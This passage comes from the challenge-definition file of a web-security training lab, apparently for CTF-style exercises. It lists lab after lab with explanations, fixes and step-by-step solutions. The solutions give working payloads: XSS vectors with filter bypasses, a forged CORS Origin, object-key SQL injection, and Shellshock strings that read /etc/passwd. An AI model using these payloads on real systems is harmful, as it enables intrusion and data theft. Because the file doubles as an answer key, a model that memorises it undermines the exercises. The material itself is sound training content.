        reportImpact: { easy: "Full cross-origin theft of authenticated API responses from any website.", medium: "Same impact from any attacker domain containing the trusted substring.", hard: "Same impact from a sandboxed-iframe attacker page sending Origin: null." },
        solutionSteps: {
          easy: ["Set the Origin field to https://evil-attacker.test and send.", "Response headers reflect it with credentials allowed. FLAG appears in the body."],
          medium: ["A fully unrelated origin is now rejected.", "Try: https://securecorp-demo.test.evil-attacker.test", "FLAG appears."],
          hard: ["Substring bypasses no longer work.", "Set the Origin field to exactly: null", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // -------------------------------------------------------- CLIENT-SIDE
      {
        id: "dom-xss", category: "client-side", title: "DOM-Based XSS", shortTitle: "DOM XSS",
        tags: ["client-side", "dom-xss", "dom", "xss", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Welcome Widget", blurb: "The payload never touches the server — source and sink are both purely client-side.",
        inputContext: "URL fragment / query (client-side only)",
        goal: { explain: "DOM-based XSS happens entirely in the browser: a client-side source (like location.hash) flows into a client-side sink (like innerHTML) with no server round-trip at all.",
          example: "#<img src=x onerror=alert(1)> — the server never even sees this; it's parsed and rendered purely by your browser's own JavaScript.",
          mission: ["Get the page's own JavaScript to render your payload as live markup.", "The FLAG appears (already embedded client-side) once the injection is confirmed."] },
        difficultyNotes: { easy: "location.hash → innerHTML, no filtering.", medium: "location.search → innerHTML, '<script' is stripped client-side.", hard: "A simReferrer param → document.write(), '<script'/onerror=/onload= are all stripped." },
        why: "Client-side JavaScript inserts untrusted data (from the URL) into the DOM via an unsafe sink with insufficient sanitization.",
        fix: "Avoid innerHTML/document.write with untrusted data entirely — use textContent, or a sanitizer library, for any client-derived value.",
        reportSummary: { easy: "location.hash flows unsanitized into innerHTML.", medium: "A client-side denylist blocks '<script' but not event-handler-based payloads.", hard: "onerror=/onload= are also blocked, but other event handlers (onbegin, onfocus+autofocus) are not." },
        reportImpact: { easy: "Full client-side script execution — session token theft, UI manipulation.", medium: "Same impact via an event-handler payload.", hard: "Same impact via a less common but equally valid event-handler payload." },
        solutionSteps: {
          easy: ["Append to the URL: #<img src=x onerror=alert(1)>", "Reload. FLAG appears on the page."],
          medium: ["Try ?name=<script>alert(1)</script> — notice it's blocked.", "Try: ?name=<img src=x onerror=alert(1)>", "FLAG appears."],
          hard: ["onerror/onload are both blocked now.", "Try: ?simReferrer=<svg onbegin=alert(1)>", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "csp-bypass", category: "client-side", title: "Content-Security-Policy Bypass", shortTitle: "CSP Bypass",
        tags: ["client-side", "csp-bypass", "csp", "bypass", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Status Page", blurb: "A real Content-Security-Policy header is set on every response — the point is that a real CSP header alone doesn't guarantee real protection.",
        inputContext: "Query string (?note=), reflected server-side into the page HTML",
        goal: { explain: "A Content-Security-Policy is meant to be a safety net if output encoding ever fails — but only if it's actually configured strictly. Each tier here sets a real CSP header (check with curl -I) that looks protective but has one specific, well-documented real-world misconfiguration defeating it.",
          example: "Inspect the response headers first, not just the page. The policy tells you exactly what's allowed and what isn't — the bypass follows directly from reading it correctly.",
          mission: ["Get your own JavaScript to genuinely execute despite the CSP header that's actually being enforced by your browser.", "The FLAG appears once that's confirmed."] },
        difficultyNotes: { easy: "script-src allows 'unsafe-inline' — the policy exists but doesn't actually block inline scripts at all.", medium: "'unsafe-inline' is gone, but script-src allows 'unsafe-eval' — and an internal Formula Preview tool uses eval() on user input.", hard: "A per-script nonce replaces unsafe-inline/unsafe-eval — but the nonce value never rotates between requests, so it's predictable from view-source." },
        why: "CSP was configured permissively (unsafe-inline / unsafe-eval) or with a static, non-random nonce — each of which is a documented, common real-world way teams accidentally neutralize their own policy.",
        fix: "Remove 'unsafe-inline' and 'unsafe-eval' from script-src entirely; move inline logic to external same-origin files. If using nonces, generate a fresh cryptographically random value on every single response — a reused or predictable nonce provides no protection at all.",
        reportSummary: { easy: "script-src 'self' 'unsafe-inline' — CSP is present but does not block inline script execution.", medium: "'unsafe-inline' was removed, but 'unsafe-eval' remains, reachable via a client-side eval() sink.", hard: "A nonce-based policy is used, but the nonce is a fixed value that never changes between responses." },
        reportImpact: { easy: "Full script execution in the victim's session via any reflected or stored injection point — the CSP header provides no real defense-in-depth.", medium: "Same impact, reached via the eval-based sink instead of direct markup injection.", hard: "Same impact — an attacker who observes the policy once (e.g. via view-source on any page load) can craft a correctly-nonced payload for every future request." },
        solutionSteps: {
          easy: ["curl -I the page and note script-src includes 'unsafe-inline'.", "Try: ?note=<script>window.__cspBypassConfirmed()</script>", "FLAG appears."],
          medium: ["Notice the same note payload no longer executes — 'unsafe-inline' is gone.", "curl -I again — 'unsafe-eval' is still allowed.", "Use the Formula Preview field (a real eval() sink) and enter: window.__cspBypassConfirmed()", "FLAG appears."],
          hard: ["View-source and find the legitimate app script's nonce attribute.", "Reload the page — the nonce value is identical every time.", "Try: ?note=<script nonce=\"THAT-SAME-VALUE\">window.__cspBypassConfirmed()</script>", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "header-xss", category: "client-side", title: "XSS via HTTP Headers", shortTitle: "Header-Based XSS",
        tags: ["client-side", "header-xss", "header", "xss"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Admin — Visitor Log", blurb: "An admin log viewer reflects User-Agent and Referer unescaped.",
        inputContext: "Simulated request headers (User-Agent / Referer)",
        goal: { explain: "Any reflected input surface counts — not just visible form fields. Admin log/analytics viewers that echo raw request headers are a classic real-world XSS source.",
          example: "In a real test you'd set these with Burp Repeater or curl -A / -H. Here they're modeled as explicit form fields for convenience.",
          mission: ["Get a header value to render as live markup in the admin log.", "The FLAG appears once that's confirmed."] },
        difficultyNotes: { easy: "Neither field is escaped.", medium: "User-Agent strips '<script' — Referer doesn't.", hard: "Both fields strip '<script'/onerror=/onload= — try a different event handler." },
        why: "Request headers are logged and rendered into an HTML table with insufficient output encoding.",
        fix: "Escape ALL logged/displayed values for HTML context, regardless of which specific header a past bug report happened to mention.",
        reportSummary: { easy: "Both simulated header fields render unescaped.", medium: "User-Agent is fixed, Referer — logged and rendered the same way — isn't.", hard: "Both fields block the common onerror/onload vectors, but not other valid event-handler attributes." },
        reportImpact: { easy: "Stored-style XSS against any admin viewing the log.", medium: "Same impact via the Referer field.", hard: "Same impact via an unblocked event handler." },
        solutionSteps: {
          easy: ["Set Simulated User-Agent to: <img src=x onerror=alert(document.cookie)>", "Submit. FLAG appears."],
          medium: ["Try the same in User-Agent — notice it's blocked.", "Put it in Referer instead.", "FLAG appears."],
          hard: ["onerror is blocked in both fields now.", "Try: <svg onbegin=alert(1)>", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "clickjacking", category: "client-side", title: "Clickjacking", shortTitle: "Clickjacking",
        tags: ["client-side", "clickjacking"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Wire Transfer Approval", blurb: "A sensitive 'Approve Transfer' page can be framed and disguised by an attacker overlay.",
        inputContext: "Response headers (X-Frame-Options / CSP)",
        goal: { explain: "If a page performing a sensitive action can be embedded in an invisible iframe, an attacker can trick users into clicking it while showing a decoy UI on top.",
          example: "A transparent iframe of the real 'Approve' button, overlaid with a fake 'Claim your prize!' banner — the click lands on the real button.",
          mission: ["Check whether this page can be safely framed at each difficulty.", "Open the attacker overlay demo to see the technique in action."] },
        difficultyNotes: { easy: "No X-Frame-Options or CSP frame-ancestors at all.", medium: "X-Frame-Options: ALLOW-FROM is set — but it's deprecated and ignored by every modern browser.", hard: "X-Frame-Options: SAMEORIGIN + a real CSP frame-ancestors — genuinely fixed." },
        why: "The page sends no real framing protection (or a deprecated, non-functional one) in its response headers.",
        fix: "Send X-Frame-Options: DENY or SAMEORIGIN AND a modern Content-Security-Policy: frame-ancestors directive — never rely on ALLOW-FROM, which no current browser honors.",
        reportSummary: { easy: "No anti-framing headers at all.", medium: "ALLOW-FROM is set but provides zero real protection in any modern browser.", hard: "A correct, modern combination of SAMEORIGIN + frame-ancestors 'self' is in place." },
        reportImpact: { easy: "Any origin can frame and clickjack this sensitive action.", medium: "Same impact — the header looks protective but isn't.", hard: "Not exploitable via this vector — note this as a correctly-fixed control in your report." },
        solutionSteps: {
          easy: ["Open the attacker overlay demo link.", "Notice the page frames freely with no protection. FLAG appears on the main lab page (curl -I to confirm no headers are set)."],
          medium: ["Check the response headers (curl -I) — ALLOW-FROM is present.", "Confirm it's deprecated / ignored by your browser.", "FLAG appears (same page)."],
          hard: ["Check headers — SAMEORIGIN + frame-ancestors 'self' are both present and correct.", "This is a genuine fix — no flag at this tier, note it in your report."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "client-side-validation-bypass", category: "client-side", title: "Client-Side Validation Bypass", shortTitle: "Client-Side Validation",
        tags: ["client-side", "client-side-validation-bypass", "client", "side", "validation", "bypass"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Employee Discount Request", blurb: "The UI enforces a 15% max discount — the API behind it enforces nothing.",
        inputContext: "JSON body (direct API call)",
        goal: { explain: "Foundational lesson: JavaScript form validation is a UX nicety, not a security control. Always test the API directly.",
          example: "The number input has max=\"15\" and a pre-submit JS check — neither exists once you call the API yourself.",
          mission: ["Get an effective discount above 15% applied.", "The FLAG appears once the business rule is confirmed broken server-side."] },
        difficultyNotes: { easy: "The API applies zero validation.", medium: "The API validates type/range (0–100) but never enforces the actual 15% business rule.", hard: "The top-level field is correctly capped at 15% — but a bulk-items array isn't." },
        why: "Business-rule validation exists only in client-side JavaScript (or is incomplete server-side) and is trivially bypassed by calling the API directly.",
        fix: "Enforce every business rule server-side, on every field — including nested/array fields — regardless of what client-side code also checks.",
        reportSummary: { easy: "No server-side validation of any kind on discountPct.", medium: "Type and range are validated, but the actual business rule (max 15%) is never checked.", hard: "The top-level field is correctly capped, but a bulkItems array bypasses the same rule entirely." },
        reportImpact: { easy: "Unlimited discount abuse — 100% off any purchase.", medium: "Same impact — any value up to 100 is accepted.", hard: "Same impact via the overlooked bulk-request path." },
        solutionSteps: {
          easy: ["Call the API directly with {discountPct: 100}, bypassing the UI entirely.", "FLAG appears."],
          medium: ["Notice the field is now range-checked (0–100) but 90 still succeeds.", "Confirm 90% is accepted despite the UI's 15% cap.", "FLAG appears."],
          hard: ["A plain discountPct above 15 is now rejected.", "Send {discountPct: 10, bulkItems: [{item:'A', discountPct: 90}]} instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // -------------------------------------------------------------- AUTH
      {
        id: "captcha-bypass", category: "auth", title: "CAPTCHA Bypass", shortTitle: "CAPTCHA Bypass",
        tags: ["auth", "captcha-bypass", "captcha", "bypass"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Staff Login", blurb: "A math CAPTCHA is meant to slow down automated login attempts — see how far that actually goes.",
        inputContext: "Form fields (login + captcha)",
        goal: { explain: "A CAPTCHA that's checked client-side only, replayable, or has a leftover bypass provides zero real protection against automation.",
          example: "If the API never checks the CAPTCHA server-side, scripting around it takes one line of code.",
          mission: ["Demonstrate repeated automated login attempts without ever solving a fresh CAPTCHA.", "The FLAG appears after 3 such attempts in a session."] },
        difficultyNotes: { easy: "The CAPTCHA is only checked in client-side JavaScript.", medium: "It's checked server-side now, but the same challenge can be replayed indefinitely — it never rotates or expires.", hard: "The CAPTCHA rotates and is single-use — but a leftover internal QA bypass header still works." },
        why: "CAPTCHA verification either never happens server-side, or the challenge/answer pair isn't properly single-use and session-bound.",
        fix: "Verify the CAPTCHA server-side, bind each challenge to a single session with single-use enforcement, and remove all internal testing bypasses before shipping.",
        reportSummary: { easy: "The login API never checks the CAPTCHA at all.", medium: "The API checks it, but the same answer can be replayed forever since the challenge never rotates.", hard: "Rotation and single-use are both correctly enforced — except for a forgotten X-QA-Bypass header." },
        reportImpact: { easy: "Fully unthrottled automated brute-forcing.", medium: "Same impact — solve once, script the rest.", hard: "Same impact via a leftover internal testing backdoor." },
        solutionSteps: {
          easy: ["Use the 'Run 5 automated attempts' button (or call the API directly) with any CAPTCHA answer.", "None of them are actually checked. FLAG appears after 3 attempts."],
          medium: ["Solve the CAPTCHA once correctly.", "Replay that exact same answer for subsequent automated attempts.", "FLAG appears after 3."],
          hard: ["Replaying a solved answer no longer works — it's single-use now.", "Send requests with header X-QA-Bypass: true and ?skipCaptcha=true.", "FLAG appears after 3."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "insecure-cookie-flags", category: "auth", title: "Insecure Session Cookie Attributes", shortTitle: "Cookie Flags",
        tags: ["auth", "insecure-cookie-flags", "insecure", "cookie", "flags", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Account Session", blurb: "Read your own auth cookie via JavaScript — HttpOnly should make that impossible.",
        inputContext: "Set-Cookie response header",
        goal: { explain: "A session cookie without HttpOnly can be read by any JavaScript on the page — meaning any XSS anywhere on the origin, or just an open DevTools console, can steal it outright.",
          example: "document.cookie should NOT include your auth token if HttpOnly is set correctly.",
          mission: ["Find a code path where the auth cookie is set without HttpOnly.", "The FLAG appears once you read it via JavaScript."] },
        difficultyNotes: { easy: "The main login sets the cookie without HttpOnly.", medium: "Login is fixed — but a 'Remember Me' persistent-login endpoint sets the same cookie without it.", hard: "Both are fixed — but a password-reset confirmation flow sets it insecurely too." },
        why: "One or more of the app's several cookie-setting code paths were never updated when HttpOnly was added to the 'main' one.",
        fix: "Set HttpOnly (and Secure) consistently everywhere a session cookie is issued — audit every code path, not just the primary login flow.",
        reportSummary: { easy: "The login endpoint's Set-Cookie omits HttpOnly.", medium: "Login is fixed, but a secondary 'remember me' endpoint was never updated.", hard: "Both prior paths are fixed, but a third, less obvious flow (password-reset confirmation) still lacks it." },
        reportImpact: { easy: "Full session-token theft via any script running on the page.", medium: "Same impact via the remember-me flow.", hard: "Same impact via the reset-confirmation flow." },
        solutionSteps: {
          easy: ["Click 'Simulate malicious script: read document.cookie'.", "It succeeds. FLAG appears."],
          medium: ["Notice the read fails now (HttpOnly works).", "Visit the 'Remember Me' link shown on the page, then read again.", "FLAG appears."],
          hard: ["Remember Me is fixed too.", "Visit the password-reset confirmation link shown on the page, then read again.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "session-id-in-url", category: "auth", title: "Session ID Exposure in URL", shortTitle: "Session ID in URL",
        tags: ["auth", "session-id-in-url", "session", "id", "in", "url"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Legacy Customer Portal", blurb: "This legacy app tracks sessions entirely via a URL parameter — no cookie at all.",
        inputContext: "URL query parameter (sessionid)",
        goal: { explain: "Session identifiers in URLs leak via browser history, shared links, and server access logs — structurally, in ways headers alone can never fully fix.",
          example: "An admin's session token, once logged anywhere, can be reused directly by anyone who reads that log.",
          mission: ["Find a leaked admin session token and reuse it.", "The FLAG appears once you're viewing the admin's session."] },
        difficultyNotes: { easy: "The access log (containing tokens) is open to anyone.", medium: "The log now requires a plausible-looking Referer claim — trivially spoofable.", hard: "The log requires a real access flag — but the structural problem (tokens in URLs at all) is still demonstrated via a shared support-ticket link." },
        why: "Session state lives entirely in the URL, which is inherently logged server-side, cached in browser history, and easily shared/leaked regardless of any header-level mitigation.",
        fix: "Never put session identifiers in URLs — use HttpOnly cookies exclusively for session state.",
        reportSummary: { easy: "Full access logs (including tokens) are publicly viewable.", medium: "Log access is 'restricted' by a spoofable Referer check.", hard: "Log access is properly restricted, but the root problem — tokens belong in URLs at all — remains structurally present." },
        reportImpact: { easy: "Trivial session hijacking for any user whose token appears in the log.", medium: "Same impact via a forged Referer.", hard: "Demonstrates that fixing the log doesn't fix the underlying design flaw." },
        solutionSteps: {
          easy: ["Visit the access log link.", "Reuse the admin token shown there via the dashboard URL.", "FLAG appears."],
          medium: ["The log is restricted now.", "Request it with ?simReferer=/vuln/session-id-in-url/dashboard", "FLAG appears."],
          hard: ["The log is properly restricted now.", "Follow the 'shared support ticket' link instead — it contains a pasted admin dashboard URL.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "weak-session-token", category: "auth", title: "Predictable Session Token", shortTitle: "Weak Session Token",
        tags: ["auth", "weak-session-token", "weak", "session", "token"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Kiosk Login", blurb: "Guess another user's session token instead of stealing it.",
        inputContext: "Generated session token",
        goal: { explain: "If session tokens are generated with low entropy (sequential counters, timestamps), an attacker can compute a valid token for another user without ever intercepting anything.",
          example: "Session #1042 suggests session #1 might belong to the very first user ever logged in — often an admin.",
          mission: ["Guess or compute a valid admin session token.", "The FLAG appears once you're viewing the admin's account."] },
        difficultyNotes: { easy: "Tokens are a simple incrementing counter.", medium: "Tokens are millisecond timestamps — a status panel reveals roughly when the admin last logged in.", hard: "Tokens are properly random now — but a leftover debug endpoint lists recent sessions directly." },
        why: "Session tokens are generated without a cryptographically secure random source (or a debug endpoint exposes them directly).",
        fix: "Always generate session tokens with a CSPRNG (e.g. crypto.randomBytes) with sufficient length, and remove all debug/diagnostic endpoints before production.",
        reportSummary: { easy: "Tokens are sequential integers.", medium: "Tokens are derived from low-resolution timestamps, brute-forceable within a known login window.", hard: "Token generation itself is properly randomized, but a forgotten debug endpoint leaks them directly." },
        reportImpact: { easy: "Trivial account takeover via token guessing.", medium: "Same impact via a small, targeted brute-force window.", hard: "Same impact via direct leakage from a debug endpoint." },
        solutionSteps: {
          easy: ["Log in as a guest to see the counter pattern.", "Visit the account page with token=1.", "FLAG appears."],
          medium: ["Note the 'last admin login' timestamp shown on the page.", "Try nearby millisecond timestamp values as the token.", "FLAG appears."],
          hard: ["Tokens are unguessable now.", "Visit /vuln/weak-session-token/debug-sessions instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "broken-logout", category: "auth", title: "Broken Logout / Session Invalidation", shortTitle: "Broken Logout",
        tags: ["auth", "broken-logout", "broken", "logout"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Employee Portal", blurb: "Does 'Log Out' actually invalidate your session server-side, or just redirect you?",
        inputContext: "Session token (post-logout)",
        goal: { explain: "A 'logged out' user whose token remains valid server-side is not actually logged out — anyone who captured that token earlier can keep using it.",
          example: "Click logout, then replay the old token directly against the account endpoint.",
          mission: ["Use a token from before logout to access the account after logging out.", "The FLAG appears once that's confirmed."] },
        difficultyNotes: { easy: "Logout does nothing server-side at all.", medium: "The primary token is invalidated — a separate 'remember me' token isn't.", hard: "Both are invalidated — but asynchronously, leaving a brief real race window." },
        why: "Logout either never invalidates server-side session state, misses a secondary token, or has a timing gap between the client response and actual invalidation.",
        fix: "Invalidate ALL session-granting tokens synchronously, atomically, before responding to the logout request.",
        reportSummary: { easy: "Logout is purely cosmetic — the token stays valid indefinitely.", medium: "The primary token is invalidated, but a secondary 'remember me' token isn't.", hard: "Both are invalidated, but via an async cleanup job with a real ~300ms window where the old token still works." },
        reportImpact: { easy: "Full session persistence after logout — any captured token stays useful forever.", medium: "Same impact via the overlooked secondary token.", hard: "A narrower but genuine window for continued session use after logout." },
        solutionSteps: {
          easy: ["Log in, note your token, then log out.", "Visit the account page with that same token.", "FLAG appears — it's still valid."],
          medium: ["The primary token is invalidated now.", "Use the separate 'remember me' token shown at login instead.", "FLAG appears."],
          hard: ["Both tokens are invalidated properly now.", "Immediately (as fast as possible) request the account page with the old token right after logging out.", "FLAG appears if you land inside the ~300ms window."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------------- INFRA
      {
        id: "web-storage-secrets", category: "infra", title: "Sensitive Data in HTML5 Web Storage", shortTitle: "Web Storage Secrets",
        tags: ["infra", "web-storage-secrets", "web", "storage", "secrets", "client-side-proof"],
        successCondition: "Client-proof token: the client-side exploit must genuinely execute and POST a single-use proof token back to the server, which then issues the real flag.",
        demoApp: "SecureCorp Wallet Dashboard", blurb: "An API token is kept in localStorage/sessionStorage 'for convenience.'",
        inputContext: "Browser localStorage / sessionStorage",
        goal: { explain: "Unlike an HttpOnly cookie, Web Storage has zero protection against script access — any XSS anywhere on the origin, or just an open console, can read it directly.",
          example: "localStorage.getItem('authToken') — no injection needed, just script execution.",
          mission: ["Locate and extract the secret from storage.", "The FLAG appears once it's confirmed."] },
        difficultyNotes: { easy: "Plaintext value under an obvious key.", medium: "Key is obfuscated and the value is base64-'encoded' (not encrypted).", hard: "Stored as a JWT in sessionStorage — decode the payload to read claims (no signature check needed)." },
        why: "Sensitive tokens are stored in a browser storage API with no access restriction whatsoever, mistaking encoding or an unfamiliar API for actual protection.",
        fix: "Never store sensitive tokens in Web Storage — use HttpOnly, Secure cookies exclusively for anything sensitive.",
        reportSummary: { easy: "Plaintext secret under an obvious localStorage key.", medium: "Obfuscated key name and base64 encoding — neither is real protection.", hard: "A JWT is used, creating a false impression of security — its payload is still trivially readable." },
        reportImpact: { easy: "Immediate secret exposure to any script on the page.", medium: "Same impact after one extra decode step.", hard: "Same impact — JWTs are not encryption, just structured, readable claims." },
        solutionSteps: {
          easy: ["Click 'Simulate malicious script scanning storage'.", "It finds and reports the plaintext token. FLAG appears."],
          medium: ["The scan needs to check Object.keys(localStorage) for the obfuscated key, then atob() it.", "Click the scan button — it does this for you.", "FLAG appears."],
          hard: ["The token is now in sessionStorage as a JWT.", "The scan button decodes the JWT payload (base64, no signature check) to extract the claim.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "base64-secrets", category: "infra", title: "Base64-Encoded Secrets", shortTitle: "Base64 Secrets",
        tags: ["infra", "base64-secrets", "base64", "secrets"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Developer Portal", blurb: "A 'sanitized' config export obfuscates secrets with base64 — not encryption.",
        inputContext: "Downloadable config blob",
        goal: { explain: "Base64 is an encoding, not encryption — reversible in one line, with zero cryptographic protection regardless of how many times it's applied.",
          example: "atob('YXBpS2V5OnNlY3JldA==') instantly reveals the original value.",
          mission: ["Decode the exported blob completely.", "Submit the fully-decoded secret to get the FLAG."] },
        difficultyNotes: { easy: "Single base64 pass.", medium: "Encoded twice.", hard: "Reversed, then base64-encoded." },
        why: "A field labeled 'sanitized for export' is only base64-encoded, which developers or reviewers may mistake for genuine protection.",
        fix: "Never expose real secrets in any exported artifact, encoded or not — redact or use a genuinely separate, scoped credential instead.",
        reportSummary: { easy: "One decode step reveals the full secret.", medium: "Two decode steps — still zero real protection.", hard: "Decode plus a string reversal — still zero real protection, just extra obfuscation theater." },
        reportImpact: { easy: "Full API key disclosure.", medium: "Same impact, marginally slower to notice.", hard: "Same impact — no amount of encoding-stacking equals encryption." },
        solutionSteps: {
          easy: ["Decode the blob with atob() / any base64 decoder.", "Submit the result (apiKey:...).", "FLAG appears."],
          medium: ["Decode once — result still looks like base64.", "Decode again.", "Submit the result. FLAG appears."],
          hard: ["Decode once — the result reads backwards.", "Reverse the string.", "Submit the result. FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "heartbleed-sim", category: "infra", title: "Heartbleed (Simulated)", shortTitle: "Heartbleed",
        tags: ["infra", "heartbleed-sim", "heartbleed", "sim"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API Gateway", blurb: "⚠️ SIMULATED CVE-2014-0160 — a declared length larger than the real payload leaks extra memory.",
        inputContext: "Form fields (payload / payload_length)",
        goal: { explain: "The real Heartbleed bug: a server trusted a client-declared length instead of validating it against the actual payload, over-reading adjacent memory into the response. This lab reproduces the exact request/response LOGIC against fake in-memory data — never a real TLS stack.",
          example: "payload=PING, payload_length=4 is honest. payload_length=200 asks for far more than was sent.",
          mission: ["Trigger a memory over-read large enough to leak the flag.", "The FLAG appears directly in the leaked content."] },
        difficultyNotes: { easy: "A moderate over-read is enough.", medium: "The flag sits further into the buffer — push the length higher.", hard: "One request 'warms up' the buffer; the flag only appears on a second, repeated request." },
        why: "A declared length field is trusted without validating it against the actual data size.",
        fix: "Always validate that a claimed length matches the actual data provided — never allocate or return a response sized by untrusted client input alone.",
        reportSummary: { easy: "A modest over-read leaks adjacent buffer contents including the flag.", medium: "A larger over-read is needed to reach the flag's position in the buffer.", hard: "Real Heartbleed leaks vary by server activity — this requires two requests to reach the flag." },
        reportImpact: { easy: "Memory disclosure — session tokens, credentials, or in this case, the flag.", medium: "Same impact, requiring a larger request.", hard: "Same impact, requiring a repeated request — mirrors how the real CVE needed multiple heartbeats in practice." },
        solutionSteps: {
          easy: ["Submit payload=PING, payload_length=200.", "FLAG appears in the leaked memory section."],
          medium: ["Try payload_length=200 — not quite enough.", "Push it higher, e.g. 300.", "FLAG appears."],
          hard: ["Send one heartbeat with a large payload_length.", "Send a second one right after.", "FLAG appears on the second response."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "shellshock", category: "infra", title: "Shellshock", shortTitle: "Shellshock",
        tags: ["infra", "shellshock"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Legacy Diagnostics (CGI)", blurb: "⚠️ SIMULATED CVE-2014-6271 — a magic prefix in a header value, not shell metacharacters, triggers this one.",
        inputContext: "Simulated header (User-Agent)",
        goal: { explain: "Shellshock exploits a parser bug in Bash's function-definition handling. Unlike ordinary command injection, no ; & | are needed at all — the entire payload lives inside the () { :; }; magic prefix.",
          example: "() { :; }; cat /etc/passwd — Bash parses the leading () {...} as a function definition, then keeps executing whatever follows.",
          mission: ["Trigger the classic Shellshock signature.", "The FLAG appears on confirmed (simulated) execution."] },
        difficultyNotes: { easy: "No filtering.", medium: "An exact literal prefix match blocks '() {' precisely — any whitespace variation slips through, since real Bash parses it identically.", hard: "The prefix check is now whitespace-tolerant and robust — but only checks the START of the string, not decoy-prefixed variants." },
        why: "The (simulated) legacy CGI diagnostics script passes a header value to a vulnerable Bash parser; filtering (where present) checks too narrow a pattern.",
        fix: "Patch/upgrade Bash entirely (the real fix for this CVE) — filtering header content is not a substitute for fixing the underlying interpreter.",
        reportSummary: { easy: "The classic payload works directly.", medium: "An exact-string filter is bypassed by whitespace Bash itself doesn't care about.", hard: "The prefix check is robust, but only anchored at the very start of the string — decoy content before the magic bytes still gets through." },
        reportImpact: { easy: "Full (simulated) remote code execution.", medium: "Same impact via trivial whitespace variation.", hard: "Same impact via a decoy-prefixed payload." },
        solutionSteps: {
          easy: ["Set the simulated header to: () { :; }; cat /etc/passwd", "FLAG appears."],
          medium: ["Notice the exact payload above is now blocked.", "Add a leading space: () { :; }; cat /etc/passwd (with one space before the parens).", "FLAG appears."],
          hard: ["The leading-space variant is blocked too now.", "Prepend decoy content: Mozilla/5.0 () { :; }; cat /etc/passwd", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "drupageddon", category: "infra", title: "Drupageddon (Known Vulnerable Component)", shortTitle: "Drupageddon",
        tags: ["infra", "drupageddon"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Blog (Drupal-Compatible Module)", blurb: "⚠️ SIMULATED CVE-2014-3704 — send an array where a string is expected.",
        inputContext: "JSON body (name / email / meta)",
        goal: { explain: "The real Drupageddon bug: Drupal's DB layer auto-expanded array-shaped input into extra SQL placeholders, using the array's KEYS directly as unvalidated SQL.",
          example: "Normally 'name' is a string. Send it as {\"x') OR ('1'='1\": \"y\"} instead and the object's key gets used directly in the query.",
          mission: ["Get an array-shaped field's key injected into the backing query.", "The FLAG appears when the injection returns data from a hidden table."] },
        difficultyNotes: { easy: "The 'name' field auto-expands with zero validation.", medium: "'name' is now validated as a string — 'email' on the same endpoint isn't.", hard: "Both are validated — but a 'meta' object for extra form data isn't." },
        why: "A field is validated as an expected type in some code paths but not others on the same endpoint, and array-shaped values are used unsafely as SQL fragments.",
        fix: "Validate every field's type explicitly, including nested/optional ones — never let an ORM or DB layer auto-expand attacker-controlled structures into query fragments.",
        reportSummary: { easy: "The 'name' field accepts an object and expands its key into SQL.", medium: "'name' is fixed, but 'email' — handled identically — isn't.", hard: "Both are fixed, but a bolted-on 'meta' object bypasses the same guard entirely." },
        reportImpact: { easy: "Full pre-auth SQL injection via a type-confusion bug.", medium: "Same impact via the overlooked email field.", hard: "Same impact via the overlooked nested meta object." },
        solutionSteps: {
          easy: ["POST {name: {\"x') OR ('1'='1\": \"y\"}, email: \"a@b.com\"}", "FLAG appears in the response."],
          medium: ["Notice 'name' as an object is now rejected.", "Send the same object-shaped payload as 'email' instead.", "FLAG appears."],
          hard: ["Both top-level fields are validated now.", "Send {name:\"ok\", email:\"a@b.com\", meta:{name:{\"x') OR ('1'='1\":\"y\"}}}", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
